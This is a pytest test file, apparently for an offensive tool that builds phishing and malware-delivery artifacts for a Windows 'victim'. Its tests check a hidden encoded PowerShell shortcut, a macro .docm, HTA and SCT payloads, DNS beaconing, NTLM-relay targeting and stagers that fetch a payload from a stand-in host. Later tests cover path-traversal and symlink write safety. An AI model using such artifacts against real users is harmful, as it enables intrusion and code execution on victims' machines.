"""Click-to-access orchestration: the manifest is the deliverable.

Two things are asserted here that matter more than the file count: an artifact is never
written when its input is missing (it is recorded as `needs-input` instead), and the file
names come from the recipe table, so no value in the facts can steer a write out of the
output directory.
"""
import json
import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core import ctso  # noqa: E402

pytestmark = pytest.mark.unit

# A Windows victim with an NTLM relay ready: the strongest path, so the Windows artifact
# set is in scope.
WINDOWS = {"os": "windows", "browser": "MSIE", "version": "11", "is_ie": True,
           "http_ntlm_relay_ready": True, "relay_target": True, "smb_reachable": True,
           "intranet": True, "macro_policy": "allowed", "hta_policy": "allowed",
           "beacon_filtered": True}

INPUTS = {"public_url": "https://campaign.example/trig", "payload_url":
          "https://campaign.example/p.ps1", "dns_zone": "c.example"}


def build(tmp_path, facts=None, **kwargs):
    args = dict(INPUTS)
    args.update(kwargs)
    return ctso.build_artifacts(facts or WINDOWS, str(tmp_path), **args)


class TestTheDryRun:

    def test_the_plan_lists_a_file_per_recipe_and_says_what_each_needs(self):
        plan = ctso.build_plan(WINDOWS)
        files = {item["file"] for item in plan["items"]}
        assert files == {"trigger.html", "trigger.url", "payload.lnk", "payload.hta",
                         "payload.sct", "payload.docm", "pack_entry.json",
                         "intranet.json", "dns_plan.json", "stager.js", "stager.ps1"}
        assert plan["best"] == "T2_ntlm_relay"
        by_file = {item["file"]: item for item in plan["items"]}
        assert by_file["trigger.html"]["needs"] == ["public_url"]
        assert by_file["pack_entry.json"]["needs"] == []

    def test_the_dry_run_writes_nothing(self, tmp_path):
        target = tmp_path / "plan"
        ctso.build_plan(WINDOWS)
        assert not target.exists()


class TestBuildArtifacts:

    def test_every_windows_artifact_is_written_and_recorded_with_its_digest(self, tmp_path):
        manifest = build(tmp_path)
        assert manifest["best"] == "T2_ntlm_relay"
        assert manifest["counts"]["built"] == len(ctso.RECIPES["T2_ntlm_relay"]) \
            + len(ctso.RECIPES["T5_file"]) + len(ctso.RECIPES["T4_macro"]) \
            + len(ctso.RECIPES["T3_exploitpack"]) + len(ctso.RECIPES["T1_intranet"]) \
            + len(ctso.RECIPES["C1_dns"]) + len(ctso.STAGER_FILES)
        assert manifest["counts"]["needs-input"] == 0
        assert manifest["counts"]["skipped"] == 0
        for record in manifest["artifacts"]:
            path = os.path.join(str(tmp_path), record["file"])
            assert os.path.isfile(path), record["file"]
            data = open(path, "rb").read()
            assert len(data) == record["bytes"] > 0
            from hashlib import sha256
            assert sha256(data).hexdigest() == record["sha256"]
        assert os.path.isfile(os.path.join(str(tmp_path), ctso.MANIFEST_NAME))

    def test_the_manifest_on_disk_matches_the_returned_one(self, tmp_path):
        manifest = build(tmp_path)
        on_disk = json.load(open(os.path.join(str(tmp_path), ctso.MANIFEST_NAME),
                                 encoding="utf-8"))
        assert on_disk == json.loads(json.dumps(manifest))

    def test_the_shortcut_is_a_real_lnk_and_carries_the_stager_command(self, tmp_path):
        build(tmp_path)
        data = open(os.path.join(str(tmp_path), "payload.lnk"), "rb").read()
        assert data[:4] == b"\x4c\x00\x00\x00", "the MS-SHLLINK header size"
        manifest = build(tmp_path)
        note = next(r for r in manifest["artifacts"] if r["file"] == "payload.lnk")["note"]
        assert "powershell" in note and "-enc" in note and "-w hidden" in note

    def test_the_macro_document_is_an_ooxml_zip_carrying_the_project(self, tmp_path):
        import zipfile
        build(tmp_path)
        with zipfile.ZipFile(os.path.join(str(tmp_path), "payload.docm")) as archive:
            names = set(archive.namelist())
            assert "word/vbaProject.bin" in names
            assert "[Content_Types].xml" in names

    def test_the_dns_plan_produces_query_names_for_the_zone(self, tmp_path):
        manifest = build(tmp_path)
        plan = json.load(open(os.path.join(str(tmp_path), "dns_plan.json"),
                              encoding="utf-8"))
        assert plan["sample"]["queries"] >= 1
        assert all(q.endswith("c.example") for q in plan["sample"]["qnames"])
        assert plan["beacon"]["marker"] == "beacon" or "beacon" in json.dumps(plan["beacon"])
        assert any(r["file"] == "dns_plan.json" for r in manifest["artifacts"])

    def test_operator_steps_name_one_action_per_ready_path(self, tmp_path):
        manifest = build(tmp_path)
        assert len(manifest["operator_steps"]) >= 3
        assert all(isinstance(step, str) and len(step) > 20
                   for step in manifest["operator_steps"])


class TestMissingInput:

    def test_without_a_public_url_the_trigger_is_recorded_as_needs_input(self, tmp_path):
        manifest = build(tmp_path, public_url="", payload_url="")
        by_file = {r["file"]: r for r in manifest["artifacts"]}
        assert by_file["trigger.html"]["status"] == "needs-input"
        assert by_file["trigger.html"]["needs"] == ["public_url"]
        assert by_file["payload.docm"]["status"] == "needs-input"
        assert not os.path.exists(os.path.join(str(tmp_path), "trigger.html"))

    def test_the_stagers_are_still_built_when_only_the_payload_url_is_present(self, tmp_path):
        manifest = build(tmp_path, public_url="")
        by_file = {r["file"]: r for r in manifest["artifacts"]}
        assert by_file["stager.js"]["status"] == "built"
        assert by_file["stager.ps1"]["status"] == "built"
        assert by_file["trigger.url"]["status"] == "needs-input"

    def test_a_missing_dns_zone_does_not_stop_the_other_artifacts(self, tmp_path):
        manifest = build(tmp_path, dns_zone="")
        by_file = {r["file"]: r for r in manifest["artifacts"]}
        assert by_file["dns_plan.json"]["status"] == "needs-input"
        assert by_file["trigger.html"]["status"] == "built"


class TestFailuresAreIsolated:

    def test_a_missing_capability_is_recorded_and_the_rest_still_builds(self, tmp_path):
        from core import decision
        cap_map = decision.capabilities()
        cap_map["vba"] = None
        manifest = ctso.build_artifacts(WINDOWS, str(tmp_path), caps=cap_map, **INPUTS)
        by_file = {r["file"]: r for r in manifest["artifacts"]}
        assert by_file["payload.docm"]["status"] == "skipped"
        assert "vba" in by_file["payload.docm"]["reason"]
        assert by_file["payload.lnk"]["status"] == "built"

    def test_a_broken_stager_leaves_the_shortcut_skipped_not_crashed(self, tmp_path):
        from core import decision

        class Broken:
            def powershell(self, url, *, style="iex"):
                raise ValueError("stager refused this url")

        cap_map = decision.capabilities()
        cap_map["stager"] = Broken()
        manifest = ctso.build_artifacts(WINDOWS, str(tmp_path), caps=cap_map, **INPUTS)
        by_file = {r["file"]: r for r in manifest["artifacts"]}
        assert by_file["payload.lnk"]["status"] == "skipped"
        assert "stager refused" in by_file["payload.lnk"]["reason"]
        assert by_file["payload.hta"]["status"] == "built"

    def test_a_pack_with_no_payload_on_disk_verifies_nothing(self, tmp_path):
        """The manifest carries the pack's own report: with no payload files present,
        every entry is unverified and named in `missing`."""
        manifest = build(tmp_path, pack_dir=str(tmp_path / "nope"))
        pack = manifest["pack"]
        assert pack["ok"] is True
        assert pack["verified"] == 0
        assert len(pack["missing"]) == pack["entries"] == len(ctso._lazy("exploitpack").PACK)

    def test_output_directory_is_required(self):
        with pytest.raises(ValueError):
            ctso.build_artifacts(WINDOWS, "")


class TestWriteSafety:

    def test_only_recipe_file_names_are_written_even_when_facts_are_hostile(self, tmp_path):
        hostile = dict(WINDOWS)
        hostile.update({"file": "../../escape.txt", "out_dir": "/tmp/pwned",
                        "public_url": "https://x/y", "payload_url": "https://x/p"})
        manifest = ctso.build_artifacts(hostile, str(tmp_path), **INPUTS)
        allowed = {item["file"] for item in ctso.build_plan(WINDOWS)["items"]}
        written = set(os.listdir(str(tmp_path)))
        assert written == allowed | {ctso.MANIFEST_NAME}
        assert all(r["file"] in allowed for r in manifest["artifacts"])
        assert not os.path.exists(os.path.join(str(tmp_path), "..", "escape.txt"))

    def test_every_status_is_one_of_the_three_labels(self, tmp_path):
        manifest = build(tmp_path, public_url="", dns_zone="")
        for record in manifest["artifacts"]:
            assert record["status"] in ctso.STATUSES


class TestAnArtifactWriteCannotFollowASymlink:
    """build_artifacts opened each artifact with a plain open(..., 'wb'), so a symlink
    planted at an artifact's name in a shared output directory redirected the write to
    any path the process could reach."""

    def test_a_planted_symlink_is_skipped_not_followed(self, tmp_path):
        out = tmp_path / "artifacts"
        out.mkdir()
        outside = tmp_path / "victim.txt"
        outside.write_text("original", encoding="utf-8")
        link = out / "trigger.html"
        try:
            link.symlink_to(outside)
        except (OSError, NotImplementedError):
            pytest.skip("symlinks are not available here")
        manifest = build(out)
        assert outside.read_text(encoding="utf-8") == "original"
        record = next((r for r in manifest["artifacts"] if r["file"] == "trigger.html"), None)
        if record is not None:
            assert record["status"] != "built" or not os.path.islink(link)
